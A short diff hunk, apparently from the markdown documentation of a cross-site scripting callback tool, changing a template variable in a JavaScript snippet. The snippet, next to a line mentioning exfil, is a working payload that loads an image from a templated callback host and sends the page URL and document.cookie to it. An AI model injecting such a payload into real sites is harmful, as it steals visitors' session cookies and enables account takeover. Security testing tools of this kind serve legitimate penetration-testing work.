@@ -24,7 +24,7 @@ exfil.
 (function (){
     var s = document.createElement("img");
     document.body.appendChild(s);
-    s.src="//{{ .Host }}/jscb?src="+window.location+"&c="+document.cookie;
+    s.src="//{{.Request.Host}}/jscb?src="+window.location+"&c="+document.cookie;
 })()
 
 ```
